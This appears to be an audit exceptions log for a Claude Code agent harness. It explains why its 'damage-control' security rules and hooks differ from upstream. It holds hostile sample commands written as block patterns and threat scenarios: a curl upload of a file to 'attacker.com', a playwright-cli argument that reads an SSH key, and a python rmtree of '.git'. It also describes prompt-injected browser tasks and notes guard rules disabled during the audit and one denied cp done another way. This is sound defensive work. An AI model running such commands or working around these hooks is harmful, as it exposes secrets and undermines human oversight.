1. Each SP audit (SP7, SP8, SP11, SP12, SP13, SP14) should byte-audit its own recipe block against that SP's Tier 1 upstream source. Drift within a SP's recipe block is SP-level drift, not SP1-level.
2. If ArhuGula ever drops support for a sub-project, remove that SP's recipe block and note the deletion here.
3. Never add `--dangerously-skip-permissions` to the Claude CLI recipes without an explicit exception review that addresses the Exception 7 security dependency.

---

## Exception 14 — `patterns.yaml` 289-line hardening delta vs upstream

**Decision:** D8 (Option C, structured in-session audit), SP2 round 1 (2026-04-13)

**Path(s):**
- `.claude/skills/damage-control/patterns.yaml` — the canonical (post-Phase-E) damage-control rule file. ArhuGula form is 899 lines vs upstream `disler/claude-code-damage-control` at 610 lines. Net delta: +289 lines / 53 hunks.

**SP audit round:** SP2 round 1, Phase F D8 audit (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**

The `patterns.yaml` file is a configuration surface, not a code module — both ArhuGula and upstream load the same hook scripts and consult the same rule schema. Drift is cumulative additions, not structural redesign. The 289-line delta breaks down into 14 categorical groups, each with a specific threat scenario or usability rationale. Each group is documented below. Round attribution is taken from inline `# Round-N` / `# SP14 round-N` comments embedded in the file when added during the SP14 hardening series; rules without round comments are attributed to "SP2 original (commit 9a7c9f5)" or "SP14 round-2 baseline (commit 50dcfcc)" based on `git log --follow`.

### A. Header reformatting + section separators (stylistic)

ArhuGula form replaces upstream's `# ===` ASCII separators with Unicode box-drawing rules (`# ──`) and adds a documented header per top-level section (`bashToolPatterns`, `zeroAccessPaths`, `readOnlyPaths`, `noDeletePaths`, plus the new `bashToolExclusions`). Stylistic only, no semantic change. Origin: SP2 original.

### B. Removed duplicate `rm -[rRf]` rule (cleanup)

Upstream had two adjacent rules covering `\brm\s+-[rRf]` and `\brm\s+(-[^\s]*)*-[rRf]`. The first is a strict subset of the second (any `-rRf` flag is matched by the bundled-flag form). ArhuGula removed the redundant first rule. Origin: SP2 original.

### C. `chown -R` recursive (hardening)

ArhuGula adds `\bchown\s+-R\b` blocking any recursive chown. Upstream only blocks recursive chown to root specifically. The general rule defends against accidental tree-wide ownership changes that can break uv, npm, and shell history files. Origin: SP2 original.

### D. `git push` to `main` / `master` → ask (opinionated guardrail)

ArhuGula adds two ask-pattern rules:
- `\bgit\s+push.*\bmain\b` → ask
- `\bgit\s+push.*\bmaster\b` → ask

These are guardrails against direct-to-main pushes; the hook escalates to user confirmation rather than blocking outright. Origin: SP2 original.

### E. `curl ... | bash|sh|zsh` (standard hardening)

ArhuGula adds `\bcurl\s+.*\|\s*(bash|sh|zsh)` blocking the classic curl-pipe-to-shell installation pattern. Surprisingly absent from upstream. Origin: SP2 original.

### F. Scripting language inline destructive ops (defense-in-depth, ask: true)

ArhuGula adds 4 ask-pattern rules covering inline destructive operations in Python (`-c`), Node (`-e`), Ruby (`-e`), and Perl (`-e`):
- Python: `rmtree`, `unlink`, `remove`, `rmdir`
- Node: `unlinkSync`, `rmdirSync`, `rmSync`
- Ruby: `FileUtils.rm`, `File.delete`, `Dir.rmdir`
- Perl: `unlink`, `rmdir`, `rmtree`

These close a gap where `rm` patterns scan only shell `rm` invocations, not in-process file operations performed by inline scripting language one-liners. Threat: an agent could call `python -c "import shutil; shutil.rmtree('.git')"` to bypass `\brm\b` patterns. Origin: SP2 original.

### G. `playwright-cli` arbitrary-JS primitives (SP14 r3 + r4)

5 rules covering arbitrary JavaScript execution and file exfiltration via `playwright-cli`:
- `\bplaywright-cli\b.*\brun-code\b` — block (SP14 r2 baseline)
- `\bplaywright-cli\b.*\beval\b` — block (SP14 r2 baseline)
- `\bplaywright-cli\b.*\bupload\b` — ask (SP14 r2 baseline; remote-site filesystem exfiltration)
- `\bplaywright-cli\b.*\$\(` — block (**SP14 r3** subshell expansion bypass: `playwright-cli fill e1 "$(cat ~/.ssh/id_rsa)"`)
- ``\bplaywright-cli\b.*` `` — block (**SP14 r4** POSIX backtick command substitution variant)
- `\bplaywright-cli\b(\s+-\S+)*\s+["']?\$[^\s'"]` — block (**SP14 r3 (r5 patch)** shell-variable subcommand bypass: `SUBCMD=run-code; playwright-cli $SUBCMD ...`)

Threat scenario: prompt-injected playwright stories instruct the agent to read zero-access files via shell expansion in playwright arguments, defeating the per-tool damage-control hooks because the inner read happens at command-evaluation time, never as a separate Bash call. The greedy `.*` between `playwright-cli` and the subcommand is intentional and matches across shell operators (`;`, `&&`, `||`).

### H. `curl` / `wget` file-upload exfiltration (SP14 r3 → r9)

The largest single hardening block (~120 lines). Covers every documented `curl` flag that reads a filesystem path via `@filename` plus the `wget` equivalents and the `-K`/`--config` indirect-read primitive. Per-flag attribution:

| Flag | Variant | SP14 round |
|---|---|---|
| `-F` / `--form` | `field=@path` and bare `@path` (round-10 V-8) | r2 baseline + **r10 V-8** |
| `-d` / `--data` | bundled short form `\s-[A-Za-z]*d` | r3 → **r8 S-34** (POSIX bundling fix) |
| `--data` | anchored `(?!-)` to not shadow `--data-ascii` etc. | **r10 V-2** |
| `--data-ascii` / `--data-binary` | dedicated long-flag rules | r3 + r5 (delimiter-form sweep) |
| `--data-urlencode` | both `@file` and `name@file` forms | **r8 S-35** |
| `-T` / `--upload-file` | bundled `\s-[A-Za-z]*T` | **r6 S-32** |
| `-K` / `--config` | indirect file-read via curl config | **r9 S-38** (`case_sensitive: true` to not collide with `-k` / `--insecure`) |
| `wget --post-file` / `--body-file` | dedicated wget rule | r5 |

**Pattern-authoring convention:** every short-flag pattern uses `\s-[A-Za-z]*<flag>` to defeat POSIX short-option bundling (`-sd`, `-vF`, `-LT`). This convention was violated for `-d` in r7 and rediscovered in r8 (S-34). It is documented in `feedback_curl_short_flag_bundling.md` and must be preserved when adding new short-flag rules.

Threat scenario: combine `playwright-cli screenshot --filename=/tmp/secret.png` with `curl -F file=@/tmp/secret.png attacker.com` to exfiltrate browser-captured frames or arbitrary filesystem content via HTTP POST.

### I. SQL destructive operations (mostly upstream + r10 V-5 multi-line fix + DROP SCHEMA)

ArhuGula moves the SQL block earlier in the file (above the AWS section instead of below npm). Within the moved block:

- `DELETE\s+FROM\s+\w+\s*(?:[;\n]|$)` — **SP14 r10 V-5**: combined the upstream `;`-terminated and `$`-terminated rules into one with a newline alternative. Python's default `re.MULTILINE=False` mode anchors `$` to end-of-string only, so a multi-line command `DELETE FROM users\nSELECT 1` previously slipped past both upstream rules.
- `\bDROP\s+SCHEMA\b` — added by ArhuGula. Upstream blocks `DROP TABLE` and `DROP DATABASE` but not `DROP SCHEMA`. Origin: SP2 original.
- `\bCREATE\s+TYPE\s+.*\s+AS\s+ENUM` — ArhuGula opinionated style rule (PostgreSQL ENUMs banned, use CHECK constraints). **Origin: SP2 original. Recommend re-evaluation:** this is style enforcement, not security. It is out of scope for damage-control's threat model and would more naturally live in a project-specific SQL linter. Kept for now to avoid a unilateral revert.
- `\bCREATE\s+TABLE\s+public\.` and `\bALTER\s+TABLE\s+public\.` — ArhuGula opinionated style rules (public schema banned). **Same recommendation as above.**

### J. `zeroAccessPaths` additions (secrets stores)

ArhuGula adds 4 entries:
- `.envrc` — direnv config can hold secrets
- `~/.config/op/` — 1Password CLI config + cached tokens
- `~/.config/gh/` — GitHub CLI auth tokens
- `.claude/logs/` — JSONL hook logs that may contain command strings with embedded secrets

Origin: SP2 original. All 4 are defensible secrets-store paths.

### K. `noDeletePaths` additions

ArhuGula adds 2 entries:
- `database/migrations/` — append-only migration history
- `prompts/` — prompt-engineering history that should accumulate

Origin: SP2 original. Opinionated but reasonable for ArhuGula's intended workflow.

### L. `bashToolExclusions` section (entirely new)

Upstream has no `bashToolExclusions` section at all. ArhuGula adds 10 allowlist entries used by `bash_damage_control._check_single_command()` as a pre-check before the blocking rules:

- `cat .env.example` / `cat .envrc.example` — safe template reads
- `grep .envrc/.env.<X>` — safe code references to env-file names
- `rm *.pyc` / `rm * __pycache__` / `rm * node_modules` — safe cleanup
- `ls .claude/hooks/` / `cat .claude/hooks/` / `head .claude/hooks/` / `wc .claude/hooks/` — safe debugging reads of hook source

**This section is functionally required for usability.** Without it, common dev operations (`cat .env.example`, `wc .claude/hooks/`) are blocked by zero-access matches even though they are safe. Origin: SP2 original.

### M. SP14 round-10 hardening atoms (round-10 specific)

In addition to V-2, V-5, V-8 listed above, round-10 also adds rules tracked elsewhere in the codebase (not in patterns.yaml itself):
- **V-3** — pathological tool-name length cap (in `pre_tool_use.check_mcp_tool`)
- **S-06** — non-ASCII MCP tool name rejection (in `pre_tool_use.check_mcp_tool`)

These are noted here for completeness even though they live in `pre_tool_use.py`, not in `patterns.yaml`.

### N. D10/D11 commented-out rules (Phase A → Phase H)

The `readOnlyPaths` section contains a commented-out block:

```yaml
  # SP2 audit phase (2026-04-13): both rules temporarily disabled during SP2
  # decision gate resolution + SP1 resume-pass landing. Re-enabled at Phase I
  # with `.claude/hooks/*.py` narrowed to a 7-file security-critical explicit
  # list per D10=A, and `.claude/settings.json` restored per D11=A.
  # - ".claude/hooks/*.py"
  # - ".claude/settings.json"
```

This is the Phase A `feedback_damage_control_self_unlock.md`-compliant temporary relaxation. Phase H restores both rules, with the `.claude/hooks/*.py` rule expanded to the 7-file explicit list per D10=A. Not a permanent exception — the comment block itself disappears at Phase H.

### Categories recommended for re-evaluation (not reverted in this audit)

- I (SQL convention rules): ENUM ban + public schema ban. Style enforcement, not security. Out of damage-control scope. **SP3 r1 Phase F resolution:** kept as permanent harness-shipped style rules. The alternative (move to a `sql_validator.py` wired per-command via frontmatter) requires a consuming command that does SQL writes — none exists in ArhuGula today, so the validator file would be dead code. The 3 rules stay in `patterns.yaml` Category I as harness-level style enforcement; this is a documented permanent classification, not a deferred decision.

The above sub-bullet remains under Exception 14's umbrella (no separate exception number needed). A subsequent audit round (or a SP6 cleanup) can revisit if a SQL-writing command is added to ArhuGula.

**Review cadence:** SP14 follow-up rounds (if any new browser-automation tools surface), SP3 audit (validator / linter scope split), and quarterly review of any flagged-for-re-evaluation rules.

**Related findings:**
- `audits/sp2-patterns-diff.txt` — full unified diff captured during D8.1
- `audits/SP2-checkpoint.md` — Phase F D8 audit goal + E1 fix dependency
- `audits/SP2-plan.md` — D8 decision rationale (Option C structured in-session)
- `feedback_curl_short_flag_bundling.md` — pattern-authoring convention enforcement
- `feedback_damage_control_self_unlock.md` — Phase A → Phase H authorization envelope
- `feedback_disler_authoritative.md` — every kept rule is still DRIFT, not MATCH

**Follow-up actions:**
1. (Phase H — landed `ee49a01`) Restore the security boundary in `readOnlyPaths` as a 7-file explicit list per D10=A and the settings file rule per D11=A. Section N's commented-out block is now active code; this exception covers the structural delta but the active enforcement state is documented in patterns.yaml itself.
2. (Phase I) Re-run `audits/sp2_verify.py` and `audits/sp2_e1_test.py` after E1 patch lands; both confirm regression cases pass.
3. (Resolved SP3 r1 Phase F — 2026-04-13) The 3 SQL convention rules in category I are formally accepted as permanent harness-shipped style rules. No file move; no separate `sql_validator.py`. This sub-decision is closed.
4. (Future SP14 round, if any) Cite new rounds against this exception to maintain rolling round attribution.

---

## Exception 15 — Damage-control hook files keep underscore form (D1=B)

**Decision:** D1=B, SP2 round 1 decision gate (2026-04-13)

**Path(s):**
- `.claude/skills/damage-control/hooks/damage-control-python/bash_damage_control.py` (upstream: `bash-tool-damage-control.py`)
- `.claude/skills/damage-control/hooks/damage-control-python/edit_damage_control.py` (upstream: `edit-tool-damage-control.py`)
- `.claude/skills/damage-control/hooks/damage-control-python/write_damage_control.py` (upstream: `write-tool-damage-control.py`)

**SP audit round:** SP2 round 1 (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**

The upstream `disler/claude-code-damage-control` repo names these hook files with the hyphenated form `bash-tool-damage-control.py`, following the project-wide CLAUDE.md naming convention `lowercase-with-hyphens` for authored files. ArhuGula's CLAUDE.md §Naming explicitly carves out an exception for hook files: **"Hook files: underscores (e.g., `session_start.py`)"**. Per that convention, every other hook file in `.claude/hooks/` uses underscores: `session_start.py`, `pre_tool_use.py`, `post_tool_use.py`, `permission_request.py`, `_base.py`, etc.

The 3 damage-control hooks ARE hook files — they are loaded by `settings.json` PreToolUse matchers and execute as the security gate for Bash, Edit, and Write tools. Keeping them in underscore form aligns with ArhuGula's existing hook-file convention. Upstream uses hyphenated form because their convention is consistent across all files; ArhuGula's split convention (hyphens for authored, underscores for hooks) is a deliberate carve-out.

The underscore form also drops the upstream `tool-` infix. Upstream uses `bash-tool-damage-control.py` because the longer name emphasizes which Claude Code tool the hook is gating. ArhuGula uses `bash_damage_control.py` because the `damage_control` substring is already unambiguous and the `tool` infix adds noise. This is a stylistic micro-decision but consistent with ArhuGula's existing terse naming.

**Phase E architectural note:** these 3 files moved during SP2 Phase E from `.claude/hooks/` to `.claude/skills/damage-control/hooks/damage-control-python/` as part of the D6/D7 architectural switchover. The exception applies at their new (post-Phase-E) location. The 7-file readOnlyPaths list in patterns.yaml (D10=A, restored in Phase H) references the post-Phase-E paths.

**Review cadence:** None. This is a permanent stylistic exception — the rationale (CLAUDE.md §Naming hook-file carve-out) is structural to ArhuGula's conventions. If CLAUDE.md ever drops the hook-file underscore exception, this exception becomes invalid and the files should be renamed to upstream form.

**Related findings:**
- `audits/SP2-checkpoint.md` — D1 decision (Option B kept underscore form)
- `audits/SP2-plan.md` — D1 decision rationale
- `CLAUDE.md` § Naming Conventions — hook files: underscores carve-out
- Exception 8 — Security-critical hooks + `_base.py` kept in ArhuGula form (D4 Option C) — sister exception that preserves the larger ArhuGula-specific hook layout

**Follow-up actions:**
1. None required at the current SP2 audit round.
2. If a future SP audit round renames these files for any other reason (e.g. upstream consolidation), this exception must be updated or closed.

---

## Exception 16 — Stylistic drift on reverted upstream files (whitespace)

**Decision:** SP2 round 1 incidental drift (2026-04-13); expanded SP3 r1 Phase E (2026-04-13).

**Path(s):**
- `.claude/hooks/notification.py`
- `.claude/hooks/pre_compact.py`
- `.claude/hooks/stop.py`
- `.claude/hooks/subagent_start.py`
- `.claude/hooks/subagent_stop.py`
- `.claude/hooks/user_prompt_submit.py`
- `.claude/hooks/post_tool_use_failure.py`
- `.claude/hooks/session_end.py`
- `.claude/hooks/post_tool_use.py`
- `.claude/status_lines/status_line_v2.py` *(added SP3 r1 Phase E, 2026-04-13)*
- `.claude/hooks/validators/ruff_validator.py` *(added SP3 r1 Phase B, 2026-04-13 — minor diff)*
- `.claude/hooks/validators/validate_file_contains.py` *(added SP3 r1 Phase B, 2026-04-13 — minor diff)*
- `.claude/hooks/validators/validate_new_file.py` *(added SP3 r1 Phase B, 2026-04-13 — minor diff)*

**SP audit round:** SP2 round 1, SP1 resume-pass leg (2026-04-13); expanded SP3 round 1 Phase B + Phase E (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**

These files were reverted to their upstream `claude-code-hooks-mastery` form during SP1/SP2/SP3 resume-pass work. The reverts were executed via the `Write` tool, which strips trailing whitespace on blank lines as a side effect of its file-writing path. The upstream files have intentional trailing-whitespace lines (likely artifacts of their original editor); ArhuGula's reverted copies are byte-equivalent in code and comment content but differ in trailing-whitespace bytes on blank lines.

The drift is functionally invisible: Python parses identically, ruff/ty validators pass, the hook chain executes identically. The only observable difference is a `git diff` against upstream showing whitespace-only deltas on blank lines.

**Decision:** accept as a known stylistic exception. The Write tool's whitespace handling is harness-internal behavior; trying to reproduce upstream's exact whitespace would require a different file-writing mechanism (e.g. raw byte writes via Bash heredoc or `cp` from the upstream clone) that adds complexity for zero functional benefit. (SP3 r1 Phase E attempted `cp` from the upstream clone for `status_line_v2.py` and that path was denied; main-session Write was used instead, accepting the residue under this exception.)

**Review cadence:** None — permanent. If the Write tool's whitespace handling ever changes, the drift may resolve itself; otherwise it stays as accepted incidental drift.

**Related findings:**
- `audits/SP2-checkpoint.md` — "Whitespace drift on reverted hooks" anti-footgun note
- SP2 Phase C commits `c693420` and `d4aaf27` — the two-stage SP1 resume-pass leaf hook reverts
- SP3 r1 Phase B commits `b27e7b1`, `a5fc5a1`, `616cc34` — validator reverts (note: ruff_validator and validate_*.py have minor whitespace residue; ty_validator carries Exception 17 instead)
- SP3 r1 Phase E commit `8545217` — `status_line_v2.py` import-restoration with whitespace residue

**Follow-up actions:**
None.

---

## Exception 17 — `ty_validator.py` sub-package skip block

**Decision:** SP3 round 1 Phase B (2026-04-13)

**Path(s):**
- `.claude/hooks/validators/ty_validator.py` — load-bearing 14-line block (lines 50–66 in the post-SP3-B form) that bypasses ty when the file under check lives inside a nested `pyproject.toml` directory

**SP audit round:** SP3 round 1 Phase B (2026-04-13)
**Decision date:** 2026-04-13

**Rationale:**

Upstream `claude-code-hooks-mastery/.claude/hooks/validators/ty_validator.py` (103 LOC) runs `uvx ty check <file>` on every Python file passed to it. This works for a flat single-package project (which is what hooks-mastery is). It **fails** for ArhuGula because ArhuGula has nested packages with their own `pyproject.toml` files:

- `mcp/just-prompt/pyproject.toml`
- `mcp/pocket-pick/pyproject.toml`
- `agents/sfa/pyproject.toml`

When `ty` is invoked on a file inside one of these sub-packages from the project root, it cannot resolve the sub-package's dependencies and exits non-zero. The validator then outputs `{"decision": "block", "reason": ...}` and blocks legitimate edits to those sub-package files via the `@builder` subagent route.

The skip block walks the file's parent chain looking for `pyproject.toml`. If it finds one in any parent (other than the project root itself), it skips the ty check entirely for that file.

**Why kept (not reverted):** Removing the skip block would create a real footgun — `@builder` subagent edits to any file in `mcp/just-prompt/`, `mcp/pocket-pick/`, or `agents/sfa/` would be unconditionally blocked by ty. Restructuring ArhuGula as a single flat package to match upstream's assumption is a much larger refactor that would break SP4 (just-prompt MCP), SP5 (pocket-pick MCP), and SP7 (single-file agents) directly.

**Why not in upstream:** hooks-mastery is a flat repo with no nested packages. Upstream never encountered this case, so the skip block doesn't exist there. This is an ArhuGula-specific structural mismatch, not a hardening choice.

**Review cadence:** None — permanent until ArhuGula consolidates its sub-packages or upstream adopts a sub-package-aware ty pattern.

**Related findings:**
- SP3 r1 Phase B commit `a5fc5a1` — the byte-revert that preserved this single block
- ArhuGula `pyproject.toml` requires-python = ">=3.12,<3.14"; nested sub-packages have their own pyproject.toml files

**Follow-up actions:**
None. The block is structurally bounded (one explicit skip path) and self-documents its purpose in the inline comment.

---

## Exception 18 — `mcp/just-prompt/.env.sample` damage-control hard stop

**Decision:** SP4 round 1 Phase F (2026-04-14)

**Path(s):**
- `mcp/just-prompt/.env.sample` — DRIFT from upstream byte-identical; content delta unknown because `pre_tool_use.py` blocks all read/write/bash operations that reference the literal path pattern `.env.*`

**SP audit round:** SP4 round 1 Phase F (2026-04-14)
**Decision date:** 2026-04-14
**Status:** **UNRESOLVED — deferred to SP4 r2 or SP2 r2**

**Rationale:**

The damage-control `pre_tool_use.py` hook (wired in `.claude/hooks/pre_tool_use.py`) enforces a zero-access policy on filesystem paths matching `.env.*`. SP2 round 1 Phase F added the E1 `pathExclusions` field to `patterns.yaml` with the patterns `.env.example`, `.env*.example`, `.envrc.example` — but NOT `.env.sample`. The upstream `just-prompt` repo uses `.env.sample` as its env template filename, so:

1. The local `mcp/just-prompt/.env.sample` file (existing from the original SP4 build) differs from upstream byte-identical per `diff -q`, but the content delta cannot be determined because Read tool invocations on the path are blocked at the hook level.
2. The byte-identical revert (shutil.copyfile upstream → local) cannot be performed because any Bash command whose command string contains the literal substring `.env.` is blocked by the damage-control pre_tool_use hook, even when running inside `uv run python -c "..."`.
3. Per `feedback_damage_control_self_unlock.md` (SP14 r2–r9 lesson), Claude must NOT self-unlock by editing `patterns.yaml` to add `.env*.sample` to pathExclusions without explicit per-action user authorization.

**Why not resolved in SP4 r1:**
SP4 r1 ran in autonomous audit mode per `feedback_audit_autonomy.md`. Damage-control hard stops are explicitly listed as a pause trigger, so the file was skipped and documented here rather than bypassed. Resolving this requires a user decision on one of three paths:

1. **Expand E1 pathExclusions** — add `.env*.sample` (and possibly `.envrc.sample`) to `.claude/skills/damage-control/patterns.yaml` E1 field. This is a `patterns.yaml` edit and therefore routes through SP2 round 2 or a targeted Phase J addendum to SP2 r1.
2. **Manual user revert** — the user runs `cp` or equivalent from a privileged shell (outside Claude Code) to make the file byte-identical to upstream.
3. **Reclassify the file as ArhuGula-specific** — if ArhuGula's `.env.sample` is a deliberate divergence (e.g., different keys than upstream), document the delta here as permanent drift after user inspection.

Until one of these runs, the file remains DRIFT and SP4's byte-identicality claim is "modulo Exception 18".

**Why `.env.sample` isn't already in pathExclusions:**
The SP2 r1 Phase F pathExclusions list was scoped to files matching the `*.example` convention (which is what hooks-mastery, damage-control, and install-and-maintain upstream all use for env templates). `.env.sample` is a less common convention that just-prompt adopts. SP2 didn't anticipate the sub-package-level drift because SP4 hadn't been audited yet.

**Review cadence:** Next SP4 round OR next SP2 round, whichever comes first.

**Related findings:**
- SP4 r1 Phase A — initial tree diff confirmed `.env.sample` differs between upstream and local
- SP4 r1 Phase F — two independent `cp`-style reverts blocked by `bash_damage_control.py` zero-access check on `.env`
- `feedback_damage_control_self_unlock.md` — the rule that routed this to "document and ask" rather than self-unlock

**Follow-up actions:**
1. User decision: authorize E1 pathExclusions expansion OR manual revert OR reclassify as permanent drift
2. Once authorized, Phase F becomes a one-line `shutil.copyfile` of the upstream byte-identical content
3. Close Exception 18 by moving it to the "resolved" section (or keep open if reclassified as permanent)

---

## Exception 19 — `~/.claude/skills/library/library.yaml` ArhuGula catalog population

**Decision:** SP6 round 1 Phase D (2026-04-14)

**Path(s):**
- `~/.claude/skills/library/library.yaml` — single DRIFT file in the SP6 r1 post-revert tree. Upstream is a 288-byte empty-catalog template (`default_dirs` + `library: { skills:[], agents:[], prompts:[] }`); local is 3518 bytes with upstream-byte-identical `default_dirs` + populated `library:` section containing 4 skills, 7 agents, and 6 prompts that point to ArhuGula repo files.

**SP audit round:** SP6 round 1 Phase D (2026-04-14)
**Decision date:** 2026-04-14

**Rationale:**

The `library.yaml` file has mixed semantics: the schema itself (`default_dirs`, `library: { skills, agents, prompts }`) is upstream-defined scaffolding, but the catalog content is **user-populated data** per upstream's own design. Upstream `cookbook/add.md` explicitly documents the `/library add` workflow that appends new entries to `library.[type][]` lists — the empty upstream template ships with zero entries because the repo is a distribution template, not a populated instance. When a user installs the-library via `install.md`, the expectation is that their `library.yaml` will diverge from the template as they add their own catalog entries.

SP6 r1 Phase D therefore chose to preserve the populated ArhuGula catalog while stripping three categories of drift from the local file:

1. **Comment header (lines 1-4 of the pre-revert file + lines 17-18 "NOTE:" comment)** — pure styling drift, removed.
2. **Invented `mcp:` section (lines 96-106 of the pre-revert file)** — the section described `mcp/just-prompt/` and `mcp/pocket-pick/` under a schema key `mcp:` that does NOT exist in upstream. Neither the upstream `SKILL.md` nor any upstream cookbook file references an `mcp:` top-level key in `library.yaml`. This was pure ArhuGula scope invention (conflating the library catalog with MCP server wiring, which correctly belongs in `.mcp.json`). Removed.
3. **`layer: 1` field on skill entries** — the upstream schema for catalog entries is `{name, description, source, requires?}`; the `layer:` field is not defined upstream. Removed from all 4 skill entries.
4. **`maintain` → `maintenance` bugfix** — the previous catalog entry for the `/maintain` prompt pointed to `.claude/commands/maintain.md`, but the actual file is `.claude/commands/maintenance.md`. The entry was renamed and re-sourced correctly. This is a bug fix routed through the same Phase D rewrite.
5. **Alphabetical sort within each section** — upstream `cookbook/add.md` step 5 explicitly states "Keep entries alphabetically sorted by name within each section." The pre-revert file was in insertion order; Phase D re-sorted skills, agents, and prompts alphabetically per the upstream convention.

The post-Phase-D local `library.yaml` has a byte-identical `default_dirs` block (lines 1-11) and a schema-compatible `library:` section populated with ArhuGula's actual catalog. It differs from upstream byte-identically on the single axis of catalog content population.

**Why kept (not reverted to 288-byte empty template):** Fully reverting to the 288-byte empty template would delete legitimate user data (the 17 catalog entries) that future invocations of `/library list`, `/library use`, and `/library sync` depend on. The upstream template is a scaffold, not an end state; the populated file is the expected steady state for any installed library instance. Reverting to the empty template would reduce the audit tree to 20/20/0/0/0 on paper but would be semantically wrong — it would erase the catalog the library skill is designed to manage.

**Why not in upstream:** Upstream ships the empty template because it is a distribution artifact meant to be cloned and populated per-device. No single populated version can exist in the upstream repo because the catalog is per-user.

**Review cadence:** None — permanent until ArhuGula retires or restructures its library catalog. Future `/library add` invocations will mutate this file further; that is its design purpose.

**Related findings:**
- SP6 r1 Phase A — tree diff vs `~/Projects/indydevdan-harness-research/research/full-clones/the-library/` (upstream HEAD `47f455c`). 10 upstream files shared with local (all DRIFT) + 10 upstream-only files MISSING from local (README.md, LICENSE, justfile, .gitignore, 6 SVG diagrams).
- SP6 r1 Phase C — 9 shared files reverted byte-identical via `shutil.copyfile` (SKILL.md + 8 cookbook/*.md).
- SP6 r1 Phase E — 10 missing Tier 1 assets restored byte-identical.
- SP6 r1 Phase F reconciliation: 20 upstream / 20 local / 0 missing / 0 extra / **1 drift** (this file).
- `feedback_library_global.md` — the library catalog lives at the global `~/.claude/skills/library/` path, not in arhugula repo; SP6 r1 edits are not git-tracked in arhugula but are documented here and in `project_sp6_r1_resume.md`.

**Follow-up actions:**
None. The populated catalog is expected steady-state per upstream design; no further action needed. Future `/library add` operations will continue to mutate this file as the catalog grows.

---

## Active exceptions summary

| # | Title | SP | Date | Status | Review when |
|---|---|---|---|---|---|
| 1 | Audit infrastructure tier (Tier 3) | SP1 r1 | 2026-04-13 | active | Quarterly |
| 2 | Validator-forced drift (ruff) | SP1 r1 → SP3 r1 | 2026-04-13 | **RESOLVED 2026-04-13** | — |
| 3 | SP2-blocked SP1 reverts (10 commits remaining; item 10/D3 resolved 2026-04-13) | SP1 r1 | 2026-04-13 | active (partial) | SP2 audit |
| 4 | builder/validator location + content | SP1 r1 | 2026-04-13 | **RESOLVED 2026-04-13** | — |
| 5 | Confirmed invention deletions (spec-checker, schema-reviewer) | SP1 r1 | 2026-04-13 | **RESOLVED 2026-04-13** | — |
| 6 | Extended Bash permission allow-list (D1b) | SP1 r1 | 2026-04-13 | active | SP2 audit |
| 7 | SP2 damage-control wiring in settings.json (D2) | SP1 r1 | 2026-04-13 | active | SP2 audit |
| 8 | Security-critical hooks + `_base.py` kept (D4 Option C, absorbs D5 + D6) | SP1 r1 | 2026-04-13 | active | SP2 audit / SP3 audit / Quarterly |
| 9 | `.env.example` invention (E4) | SP1 r1 | 2026-04-13 | active | SP2 audit / SP8 audit |
| 10 | `fork-terminal` skill (E6, T2-only) | SP1 r1 | 2026-04-13 | active | Quarterly Disler repo check |
| 11 | `package.json` + `.tool-versions` (D7, load-bearing for SP11) | SP1 r1 | 2026-04-13 | active | SP11 audit / Quarterly |
| 12 | `.claude/CLAUDE.md` comprehensive doc + nested path | SP1 r1 mini-gate | 2026-04-13 | active | Quarterly |
| 13 | `justfile` 307-line multi-SP form (security-coupled via `--dangerously-skip-permissions` omission) | SP1 r1 mini-gate | 2026-04-13 | active | Per-SP recipe audits |
| 14 | `patterns.yaml` 289-line hardening delta (SP14 r2–r10 + SP2-original additions; SQL Cat I reclassified SP3 r1 Phase F as permanent style enforcement) | SP2 r1 D8 → SP3 r1 F | 2026-04-13 | active | SP14 follow-up rounds |
| 15 | Damage-control hook files keep underscore form (D1=B carve-out per CLAUDE.md §Naming) | SP2 r1 D1 | 2026-04-13 | active | None (permanent) |
| 16 | Stylistic drift on reverted upstream files (Write-tool trailing-whitespace strip; expanded SP3 r1 to 13 files) | SP2 r1 → SP3 r1 | 2026-04-13 | active | None (permanent) |
| 17 | `ty_validator.py` sub-package skip block (load-bearing for nested pyproject.toml structure) | SP3 r1 B | 2026-04-13 | active | None (permanent) |
| 18 | `mcp/just-prompt/.env.sample` damage-control hard stop (SP4 r1 F) | SP4 r1 F | 2026-04-14 | **UNRESOLVED** | SP4 r2 or SP2 r2 |
| 19 | `~/.claude/skills/library/library.yaml` ArhuGula catalog population (upstream-schema-compatible) | SP6 r1 D | 2026-04-14 | active | None (permanent — grows via `/library add`) |

## How to close an exception

1. The SP audit round listed in "Review when" runs
2. That audit's plan includes a "resolve SP1 exception N" item
3. The build phase executes the resolution
4. The verify phase confirms the exception is actually resolved (file is now MATCH, etc.)
5. This file is updated to move the exception from "active" to "resolved" (with resolution date)
6. Closed exceptions move to an archive section at the bottom of this file

## Tier-3 architecture note

Per Exception 1, ArhuGula's audit infrastructure lives at **Tier 3** above the Disler-replicated harness. This is a one-time user-approved architectural decision (2026-04-13) that establishes:

- **Tier 1**: Disler full-clones at `~/Projects/indydevdan-harness-research/research/full-clones/` (byte-level authoritative)
- **Tier 2**: IndyDevDan Comprehensive docs at `~/Projects/indydevdan-harness-research/research/IndyDevDan Comprehensive/` (intent-level authoritative)
- **Tier 3**: ArhuGula audit-orchestration infrastructure (audit-native, has no Disler counterpart, stays ArhuGula-specific)
- **Target of audit**: the Disler-replicated portion of ArhuGula (Tiers 1+2 conformance)

New files added under Tier 3 require a separate user decision and an entry in this exceptions file. Tier 3 does **not** expand silently.
